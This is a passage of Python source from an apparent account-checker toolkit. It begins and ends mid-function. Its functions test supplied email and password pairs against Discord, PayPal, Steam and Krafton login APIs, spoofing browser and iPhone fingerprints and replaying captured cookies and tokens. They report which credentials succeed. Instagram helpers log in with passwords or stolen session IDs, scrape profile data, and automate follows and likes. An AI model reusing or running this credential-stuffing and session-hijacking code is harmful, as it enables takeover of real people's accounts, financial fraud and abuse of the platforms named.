        url = "https://discord.com/api/v9/auth/login"
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'content-length': '2175',
            'content-type': 'application/json',
            'cookie': '__dcfduid=38e23636a3b411ecbf5736a31ceed201; __sdcfduid=38e23636a3b411ecbf5736a31ceed201488a0ec25b0cec1c78b382264c43cc1d5e15a14fc36fb5d768457e95a1be143f; __cf_bm=0iLa3fYJcyv2JweZtjSCjNZJ6DpPl57cO0LLY58Kp6g-1651660964-0-AXt1IkxX2zaU2OxgR7TtKG53AJmAiMXMhEVHqAEQPqkZJ897iUjllp4mgSm3y5QQTd1T24oDXmcbdXGQAwPgQ64Lwr/f6fIwD3OKqEvNWrGpSbZEhP6i08sSXYrErVOG8g==; locale=en-GB',
            'dnt': '1',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/login?redirect_to=%2Foauth2%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Fdiscord%252Fcallback%26scope%3Didentify%2520email%26state%3D6ZDY0Vq3g4l3VD2Am3ozPyoR%26client_id%3D707309417145565316',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-GB',
            'x-fingerprint': '971361236031799348.iFHY468AFtAguQhJ4i-KfFTsZn8',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMS4wLjQ5NTEuNDEgU2FmYXJpLzUzNy4zNiBFZGcvMTAxLjAuMTIxMC4zMiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMS4wLjQ5NTEuNDEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vYWNjb3VudHMua3JhZnRvbi5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6ImFjY291bnRzLmtyYWZ0b24uY29tIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vYWNjb3VudHMua3JhZnRvbi5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiYWNjb3VudHMua3JhZnRvbi5jb20iLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMjY2MTEsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9', }
        data = {
            'captcha_key': 'f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34',
            'gift_code_sku_id': 'null',
            'login': str(email),
            'login_source': 'null',
            'password': str(password),
            'undelete': 'false', }
        req = requests.post(url, headers=headers, data=data).text
        if ("Invalid Form Body") in req:
            return {'status': 'error'}
        else:
            message = {'status': 'Success',
                       'user_or_email': str(email),
                       'password': str(password)}
            return message

    def paypal(email: str, password: str) -> str:
        url = "https://api-m.paypal.com/v1/mfsauth/proxy-auth/token"
        data = 'timeStamp=1630995621211&grantType=password&firstPartyClientAccessToken=A21AAMvAFdCh_wzage8zKXYTT8DBdRy0D4sbmkiKiaEGZ7P_CqKtdPQeLGnBQNUXSIK3nBVmUnDKtZQNxdj-xhpRvhqmJ1fQg&deviceInfo=%7B%22device_identifier%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22device_name%22%3A%22Joker%22%2C%22device_type%22%3A%22iOS%22%2C%22device_key_type%22%3A%22APPLE_PHONE%22%2C%22device_model%22%3A%22iPhone%22%2C%22device_os%22%3A%22iOS%22%2C%22device_os_version%22%3A%2213.5%22%2C%22is_device_simulator%22%3Afalse%2C%22pp_app_id%22%3A%22APP-3P637985EF709422H%22%7D&adsChallengeId=auth-B44DA023-8872-4961-9BD3-DF220E915D1C&authNonce=iRcHcbnucMD1HEfRVMqMRAFoPJSHkYSPisAan9UGwvA%3D&firstPartyClientId=d3aacf450dd6aa992cfba77067560733&postLoginConfig=%7B%22experimentDetails%22%3A%7B%22res%22%3A%22digital_wallet_consumer_client%22%2C%22app%22%3A%22%22%2C%22filters%22%3A%5B%7B%22name%22%3A%22component%22%2C%22value%22%3A%22consapp%22%7D%5D%7D%2C%22configNames%22%3A%5B%22digitalWalletConfig.digitalwalletexperience%22%5D%7D&appInfo=%7B%22device_app_id%22%3A%22com.yourcompany.PPClient%22%2C%22client_platform%22%3A%22Apple%22%2C%22app_version%22%3A%228.2.2%22%2C%22app_category%22%3A3%2C%22app_guid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22push_notification_id%22%3A%22disabled%22%7D&password={password}&redirectUri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&riskData=%7B%22total_storage_space%22%3A63978983424%2C%22linker_id%22%3A%22760d2932-66b3-42db-a256-5fb401bd4646%22%2C%22bindSchemeEnrolled%22%3A%22none%22%2C%22local_identifier%22%3A%22813df9f0-140d-487f-b4ba-3dee3b89a732%22%2C%22screen%22%3A%7B%22brightness%22%3A%2240%22%2C%22height%22%3A1334%2C%22mirror%22%3Afalse%2C%22scale%22%3A%222.0%22%2C%22capture%22%3A0%2C%22width%22%3A750%2C%22max_frames%22%3A60%7D%2C%22conf_version%22%3A%225.0%22%2C%22timestamp%22%3A1630995621177%2C%22comp_version%22%3A%225.3.0%22%2C%22os_type%22%3A%22iOS%22%2C%22is_rooted%22%3Atrue%2C%22payload_type%22%3A%22full%22%2C%22ip_addresses%22%3A%5B%22fe80%3A%3Acf0%3A7688%3Aa200%3A52d4%22%2C%22172.20.10.4%22%2C%22fe80%3A%3Ae068%3A71ff%3Afe98%3A3f2f%22%2C%22fe80%3A%3A7182%3Aaf1d%3A3e52%3A1b8e%22%2C%22fe80%3A%3A8512%3Ac906%3Af8e2%3A9326%22%5D%2C%22device_name%22%3A%22Joker%22%2C%22locale_lang%22%3A%22ar%22%2C%22c%22%3A32%2C%22app_version%22%3A%228.2.2%22%2C%22sr%22%3A%7B%22gy%22%3Atrue%2C%22mg%22%3Atrue%2C%22ac%22%3Atrue%7D%2C%22conf_url%22%3A%22https%3A%5C%2F%5C%2Fwww.paypalobjects.com%5C%2FrdaAssets%5C%2Fmagnes%5C%2Fmagnes_ios_rec.json%22%2C%22os_version%22%3A%2213.5%22%2C%22tz_name%22%3A%22Asia%5C%2FAmman%22%2C%22battery%22%3A%7B%22state%22%3A2%2C%22low_power%22%3A0%2C%22level%22%3A%220.81%22%7D%2C%22user_agent%22%3A%7B%22dua%22%3A%22Mozilla%5C%2F5.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2013_5%20like%20Mac%20OS%20X%29%20AppleWebKit%5C%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Mobile%5C%2F15E148%22%7D%2C%22cpu%22%3A%7B%22activecores%22%3A2%2C%22cores%22%3A2%2C%22state%22%3A0%7D%2C%22ds%22%3Atrue%2C%22tz%22%3A10800000%2C%22TouchIDAvailable%22%3A%22true%22%2C%22vendor_identifier%22%3A%22D002CF30-09C0-4D7E-9085-DC2510E145AB%22%2C%22memory%22%3A%7B%22total%22%3A2105016320%7D%2C%22sms_enabled%22%3Atrue%2C%22magnes_guid%22%3A%7B%22id%22%3A%22d2096fd6-563a-40f5-b397-feda4bff3c34%22%2C%22created_at%22%3A1630973128059%7D%2C%22disk%22%3A%7B%22total%22%3A63978983424%2C%22free%22%3A36076568576%7D%2C%22app_guid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22system%22%3A%7B%22hardware%22%3A%22arm64%20v8%22%2C%22version%22%3A%2217F75%22%2C%22system_type%22%3A%22arm64%2064%20bit%22%2C%22name%22%3A%22N71AP%22%7D%2C%22pin_lock_last_timestamp%22%3A1630995603069%2C%22source_app_version%22%3A%228.2.2%22%2C%22bindSchemeAvailable%22%3A%22crypto%3Akmli%2Cbiometric%3Afingerprint%22%2C%22risk_comp_session_id%22%3A%22f5ebc7fc-3de5-4b0d-9786-e2434f56b60a%22%2C%22magnes_source%22%3A10%2C%22device_model%22%3A%22iPhone8%2C1%22%2C%22mg_id%22%3A%22e09f4d0d020c349c26c0f0999d460e1e%22%2C%22proxy_setting%22%3A%22host%3D172.20.10.11%2Cport%3D8089%2Ctype%3DkCFProxyTypeHTTPS%22%2C%22email_configured%22%3Afalse%2C%22device_uptime%22%3A61227499%2C%22rf%22%3A%2211011%22%2C%22dbg%22%3Afalse%2C%22cloud_identifier%22%3A%2261851f2d-5061-49f9-a510-972076107601%22%2C%22PasscodeSet%22%3A%22true%22%2C%22is_emulator%22%3Afalse%2C%22t%22%3Atrue%2C%22locale_country%22%3A%22JO%22%2C%22ip_addrs%22%3A%22172.20.10.4%22%2C%22app_id%22%3A%22com.yourcompany.PPClient%22%2C%22pairing_id%22%3A%2208dbd356968d4e64b540848e620ae3f3%22%2C%22conn_type%22%3A%22wifi%22%2C%22TouchIDEnrolled%22%3A%22false%22%2C%22dc_id%22%3A%228e2305b5387bacbea93c339fd6b1730d%22%2C%22location_auth_status%22%3A%22unknown%22%7D&rememberMe=false&email={email}&'
        headers = {
            'Host': 'api-m.paypal.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Paypal-Client-Metadata-Id': '7e414acd7909416db4ddc61f36ac689e',
            'Accept': 'application/json',
            'X-Paypal-Consumerapp-Context': '%7B%22deviceLocationCountry%22%3A%22JO%22%2C%22deviceLocale%22%3A%22ar_JO%40numbers%3Dlatn%22%2C%22deviceOSVersion%22%3A%2213.5%22%2C%22deviceLanguage%22%3A%22ar-JO%22%2C%22appGuid%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22deviceId%22%3A%22D002CF30-09C0-4D7E-9085-DC2510E145AB%22%2C%22deviceType%22%3A%22iOS%22%2C%22deviceNetworkCarrier%22%3A%22Zain%20JO%22%2C%22deviceModel%22%3A%22iPhone%22%2C%22appName%22%3A%22com.yourcompany.PPClient%22%2C%22deviceOS%22%3A%22iOS%22%2C%22visitorId%22%3A%22B44DA023-8872-4961-9BD3-DF220E915D1C%22%2C%22deviceNetworkType%22%3A%22Unknown%22%2C%22usageTrackerSessionId%22%3A%2256A2CF37-1F14-4B3D-9065-D70268A6D37B%22%2C%22appVersion%22%3A%228.2.2%22%2C%22sdkVersion%22%3A%221.0.0%22%2C%22deviceMake%22%3A%22Apple%22%7D',
            'Authorization': 'Basic QVY4aGRCQk04MHhsZ0tzRC1PYU9ReGVlSFhKbFpsYUN2WFdnVnB2VXFaTVRkVFh5OXBtZkVYdEUxbENxOg==',
            'X-Paypal-Fpti': '{"user_guid":"B44DA023-8872-4961-9BD3-DF220E915D1C","user_session_guid":"56A2CF37-1F14-4B3D-9065-D70268A6D37B"}',
            'Accept-Language': 'ar',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Length': '4670',
            'X-Paypal-Mobileapp': 'dmz-access-header',
            'User-Agent': 'PayPal/74 (iPhone; iOS 13.5; Scale/2.00)',
            'Paypal-Request-Id': '1a9154e6b56f43e69f8a96045c33d2ff'}
        res = requests.post(url, headers=headers, json=data).text
        if ("token") in res:
            message = {
                'status': 'Success',
                'email': str(email),
                'password': str(password), }
            return message
        else:
            return {'status': 'error'}

    def steampowered(email: str, password: str) -> str:
        url = "https://store.steampowered.com/login/dologin/"
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'Connection': 'keep-alive',
            'Content-Length': '569',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'browserid=2612656426703308536; timezoneOffset=7200,0; _ga=GA1.2.2134954254.1650963345; steamCountry=EG%7Cb350758a5fc0e37dac1c21162dddc8b9; sessionidSecureOAuthNonce=8ca57c5ed0ecf4ca97d3de1d; sessionid=cc3dc1fdf55251e70f382c28; _gid=GA1.2.2076872525.1651660576',
            'DNT': '1',
            'Host': 'store.steampowered.com',
            'Origin': 'https://store.steampowered.com',
            'Referer': 'https://store.steampowered.com/oauth/login?response_type=token&state=208010b01d89f4801f27010550943b88&client_id=FC7EA02C',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': str(generate_user_agent()),
            'X-Requested-With': 'XMLHttpRequest', }
        data = {
            'donotcache': '1651660632160',
            'password': str(password),
            'username': str(email),
            'twofactorcode': '',
            'emailauth': '',
            'loginfriendlyname': '',
            'captchagid': '-1',
            'captcha_text': '',
            'emailsteamid': '',
            'rsatimestamp': '25224900000',
            'remember_login': 'false',
            'tokentype': '-1', }
        req = requests.post(url, headers=headers, data=data).text
        if ("The account username or password that you have entered is incorrect.") in req:
            return {'status': 'error'}

        else:
            message = {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
            return message

    def krfton(email: str, password: str) -> str:
        url = "https://accounts.krafton.com/auth/local"
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
            'cache-control': 'no-cache',
            'content-length': '56',
            'content-type': 'application/json',
            'cookie': 'bm_sz=F67EA857720929784500B9A3D7AB63AC~YAAQ3eF6XJ/MYoeAAQAAHr+hjg8llf0f3uuXPp+Ux8LmBp8chWH5xzg6IvxPxXpWBfaECN4NwzW0PupDCp4O7iETuJjuhtoxu9ANUItua6ClsChLC7b8L3/eQ2nAoBio6WcG6feArrVwbbINFWHW80pm7hkInkIloOwRH0f6/CWRQl89ygDE6XQ6osdHWfhT3UnXFpVJBjYUY7o2rg0jW1F5cnPg/wyFli2Et9NhNlBeJhHD2sX51MrCMFd4hxWx0n1Rn+tDGXH9dcbwVvFhoynpsCbKXjd5OguTf5h+veDwceKn~3490361~3229241; _icl_current_language=en; _gcl_au=1.1.1511135528.1651660413; sessionId=s%3APzlr3Y2S57S8dCgeiJsQkQGl9s2JUAQd.FqSqwDd4hNfzYV61dPmlMDKy6jQR8CeWcpk01DOPdus; _gid=GA1.2.2130624292.1651660414; tmr_lvid=ea720c75f04b85f5f51e56d437ef578e; tmr_lvidTS=1651660413847; ak_bmsc=09DCE3805E9EA121F5C4B7B9E3911E27~000000000000000000000000000000~YAAQ3eF6XKPMYoeAAQAAr8ihjg/JNdFFqnGmUs7Ej1Qz6kJbWOB6dZe1hgAnY76aeoB3WWs1k/aC53cTUwCT+WH7n4rWrM1IilSyPPlgkcI0ThpS7WiXmApMSkrBVyC5msftRvfpOkx1L5AX+PAztJu2ygpxrmm5w871r9mTGRhzXV3tM4kACe4ZNVTK2Qfq9xmX+TiNR4WxfXJBb0NHQv3RBogVOFy6HLTfrAXFHaEyCj49qrbXanrOF6tlPNKFiju34oQ1Lr8o9ieG8jpuv/SOaxgla3t1KVKppWoD3IpzdIkFNKkt65h//L4o/QdRZ6hcX6CLJ48QApek8SntTJtLfPE7ycLZ+/f521P59Y2zAAMabbDB9AAXUVer/Z23INg/SRzrR+nGQfPOdYG49212G7Jt+ALeIW4xuUOKBWoBhKP2hf0dnLmOPwgm0cxFyR9O852T6TIPjugxDOctF1CYViGL3PEDefLOLVy5sgpoOfb1uzNdMh+FvaQ6OA==; _ym_uid=1651660416633065444; _ym_d=1651660416; _fbp=fb.1.1651660415715.791739767; _ym_isad=2; _ym_visorc=b; XSRF-TOKEN=382s9QNI-wAMptihqSH6taFY4WB1lXyy7Aqg; bm_sv=AC65DBD453D92D5067CC1506DD2635D3~hVB1Ek4onborac8Q+/DxocYyF2UD1o5bu0FJ2HyWR0voY3hwV5l6QBKKAYep4MbsetEiNS1cMk1rxJBPApTcbf7EAnllC9W3hAYRzkGvTmZ4VhN8D9vxyifQHva7yEO3T2q5wc+M3krGpA57aF7avNp0x3Aj866ElADx2S/nGhE=; _ga=GA1.1.1700580824.1651660413; RT="z=1&dm=accounts.krafton.com&si=c203a269-59d5-4cf3-b0b9-7b5618c8a312&ss=l2rfzbzv&sl=1&tt=2ye&rl=1&ld=2yg"; _abck=52691F16D214FA98D5460AD613328CD3~0~YAAQ3eF6XLfMYoeAAQAARD6ijgeyvLEIvYUJehcnbHF6dGTg7OFtdEmMRZynd7XTSkMrOc6/XfMK5wRXMXOurUNBqrXGUZDSCMLNwvC2HMV+4vUmHCRPkDf3PxDxZ0rBAb+/wrJ8gE+OMnFvDJ01fxQ3x0+eZ2WuwSpVnY00e5Lkki8Nd+7wjD1qyUMIp3CZZ/nvrwyIJ0ZgbWuZLhAP1NTp/0uRBeWIteF4RMrX7Bs8tHln6uWIaJ8ZpmBIqugUVWmvpvpOUWRCu5TUQBMS8ARRfLlOjwBGuzjLXSiz8Wr27HN52TEj31xIddVjmlp7svQDYyRIT9ZgsHqIiAh1oHhULb2Wb0AvNUptmdxi8wwCazvsDh8DxFqnL/BExyGwHKKSn2vNN03aAewNo0O+ohkDiqKWKRjdnBY=~-1~1-TmWTfQLUKk-1-10-1000-2~-1; tmr_detect=0%7C1651660445893; tmr_reqNum=7; _gat_gtag_UA_119774708_2=1; _gat_gtag_UA_94069604_1=1; _gat_gtag_UA_125508473_1=1; _ga_C3KQ2K005M=GS1.1.1651660412.1.1.1651660513.0; _dd_s=rum=1&id=3454d416-1764-43f6-aa89-cc7941b1931c&created=1651660412905&expire=1651661417829',
            'dnt': '1',
            'origin': 'https://accounts.krafton.com',
            'pragma': 'no-cache',
            'referer': 'https://accounts.krafton.com/login',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-xsrf-token': '382s9QNI-wAMptihqSH6taFY4WB1lXyy7Aqg', }
        data = {
            'email': str(email),
            'password': str(password), }
        res = requests.post(url, headers=headers, data=data).text
        if ("error.login-denied") in res:
            return {'status': 'error'}

        else:
            message = {
                'status': 'Success',
                'user_or_email': str(email),
                'password': str(password)}
            return message


# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------

class gdo_order:

    def headers_ssl(api: str) -> str:
        try:
            api = str(api)
            a1 = api.split(': ')[0]
            a2 = api.split(': ')[1]
            k = ("headers[" + "'" + a1 + "'" + "]=" + "'" + a2 + "'")
            m = (k.replace(" ", ""))
            return m
        except IndexError:
            return False

    def headers(api: str) -> str:
        try:
            api = str(api)
            a1 = api.split(': ')[0]
            a2 = api.split(': ')[1]
            ka = "'" + a1 + "':'" + a2 + "',"
            return ka
        except IndexError:
            return False

    def edit_domin_email(email: str, domin: str) -> str:
        try:
            email = str(email)
            email = str(email.split("@")[0]) + str(domin)
            return email
        except IndexError:
            return False

    def headers_config(api: str) -> str:
        try:
            asp = "  HEADER " + '"' + api + '"'
            return asp
        except IndexError:
            return False


# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------

class info_IG:

    def username(sessionid: str) -> str:
        url = "https://www.instagram.com/accounts/edit/?__a=1"
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid=' + sessionid + '; rur=VLL',
            'referer': 'https://www.instagram.com/accounts/edit/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'User-Agent': str(generate_user_agent()),
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
            'x-requested-with': 'XMLHttpRequest'}
        data = {'__a': '1'}
        res = requests.get(url, data=data, headers=headers).json()
        try:
            username = res['form_data']['username']
            return str(username)

        except:
            return False

    def followers(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            "content-type": "application/json",
            "User-agent": str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        try:
            followers = res['graphql']['user']['edge_followed_by']['count']
            return str(followers)

        except:
            return False

    def following(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            "content-type": "application/json",
            "User-agent": str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        try:
            following = res['graphql']['user']['edge_follow']['count']
            return str(following)

        except:
            return False

    def posts(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            "content-type": "application/json",
            "User-agent": str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        try:
            posts = res['graphql']['user']['edge_owner_to_timeline_media']['count']
            return posts

        except:
            return False

    def id(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            "content-type": "application/json",
            "User-agent": str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        try:
            id = res['graphql']['user']['id']
            return str(id)

        except:
            return False

    def name(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            "content-type": "application/json",
            "User-agent": str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        try:
            full_name = res['graphql']['user']['full_name']
            return str(full_name)

        except:
            return False

    def date(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'cookie': 'csrftoken=' + str(gdo_drow.csrf_token()['csrf_token']) + '; sessionid=' + str(
                secrets.token_hex(8) * 2) + ';',
            'user-agent': str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        d = str(res['logging_page_id']).split('_')[1]
        get = "https://o7aa.pythonanywhere.com/?id=" + str(d)
        head = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Host': 'o7aa.pythonanywhere.com',
            'User-Agent': str(generate_user_agent())}
        res = requests.get(get, headers=head).json()
        try:
            return str(res["data"])

        except:
            return False

    def bio(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            "content-type": "application/json",
            "User-agent": str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        try:
            bio = str(res['graphql']['user']['biography'])
            return bio

        except:
            return False

    def private(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            "content-type": "application/json",
            "User-agent": str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        try:
            private = str(res['graphql']['user']['is_private'])
            return private

        except:
            return False

    def profile(user: str) -> str:
        url = f'https://www.instagram.com/{user}/?__a=1'
        headers = {
            "content-type": "application/json",

            "User-agent": str(generate_user_agent())}
        res = requests.get(url=url, headers=headers).json()
        try:
            photo = str(res['graphql']['user']['profile_pic_url'])
            return photo

        except:
            return False


# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------

class session_IG:

    def login_sessionid(session: str) -> str:
        url = "https://i.instagram.com/api/v1/accounts/current_user/?edit=true"
        headers = {
            'X-IG-Connection-Type': 'WIFI', 'X-IG-Capabilities': '3brTBw==',
            'User-Agent': str(gdo_drow.Server_IG()),
            'Accept-Language': 'en-US',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'Connection': 'keep-alive',
            'Accept': '*/*'}
        cookies = {"sessionid": str(session)}
        res = requests.get(url, headers=headers, cookies=cookies).json()
        if str('message') in res:
            return {'status': 'error', 'login': 'error_session'}

        else:
            return {'status': 'Success', 'login': 'true', 'session': str(session)}

    def login_user_pass(username: str, password: str) -> str:

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            "Host": "www.instagram.com",
            "X-CSRFToken": str(gdo_drow.csrf_token()['csrf_token']),
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "User-Agent": str(gdo_drow.Server_IG()), }
        data = {
            "username": str(username),
            "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999),
                                                                    str(password)),
            "optIntoOneTap": False,
            "queryParams": {},
            "stopDeletionNonce": "",
            "trustedDeviceRecords": {}}

        with requests.Session() as r:
            url = "https://www.instagram.com/accounts/login/ajax/"
            response = r.post(url, data=data, headers=headers).content
            login = json.loads(response)
            if ("userId") in str(login):
                session = str(r.cookies['sessionid'])
                return {'status': 'Success', 'login': 'true', 'sessionid': str(session)}

            elif ("checkpoint_url") in str(login):
                return {'status': 'error', 'login': 'checkpoint'}

            elif ("Please wait") in str(login):
                return {'status': 'error', 'login': 'blocked'}

            else:
                return {'status': 'error', 'login': 'error.username_or_password'}

    def follower_session(user: str, session: str, csrf_token: str) -> str:
        url = "https://www.instagram.com/web/friendships/" + str(info_IG.id(user)) + "/follow/"
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '0',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YfHAnwALAAFCLfUn6sJVurIEyEfr; ig_did=DF84157E-69D8-46D5-B090-33F4741C808C; ig_nrcb=1; csrftoken=' + str(
                csrf_token) + '; ds_user_id=' + str(session.split(':')[0]) + '; sessionid=' + str(
                session) + '; rur="CLN\05453352662133\0541684424578:01f726c10813bcb9113b0f4dcf1be24a5278c0fed11c90001622f46b9b5fdf7010e66eda"',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/' + str(user) + '/',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-asbd-id': '198387',
            'x-csrftoken': str(gdo_drow.csrf_token()['csrf_token']),
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3ftyvn6nRl6sa3ptTW-Vz0nWdjaRGWCLkc_dmTa7Pg4Ag3',
            'x-instagram-ajax': '808d16d2325b',
            'x-requested-with': 'XMLHttpRequest', }
        res = requests.post(url, headers=headers).text
        if str('{"result":"following","status":"ok"}') in res:
            message = {'status': 'Success', 'following': 'true', 'userneme': str(user)}
            return message

        else:
            return {'status': 'error', 'following': 'false', 'username': str(user)}

    def like_post(url: str, session: str, csrf_token: str) -> str:
        id_ = gdo_drow.id_post(url)
        url = 'https://www.instagram.com/web/likes/{id_}/like/'
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '0',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YfHAnwALAAFCLfUn6sJVurIEyEfr; ig_did=DF84157E-69D8-46D5-B090-33F4741C808C; ig_nrcb=1; shbid="19368\05452914264168\0541682536774:01f7c91f0322a7914c4967e12bcfa34c11317752f470517e402d83ba56c43dd701276cd8"; shbts="1651000774\05452914264168\0541682536774:01f704008a362d517796cf36108b67ea9ace8dbfcadcd2a319c9f940d90aa3647ebd9dbe"; csrftoken=' + str(
                csrf_token) + '; ds_user_id=' + str(session.split(':')[0]) + '; sessionid=' + str(
                session) + '; rur="CLN\05452914264168\0541682560907:01f70b26a7341573483af51f1be279a94d451a4ebb66ffdf3419bec3f98f6850794bf7f7"',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/p/' + str(id_),
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
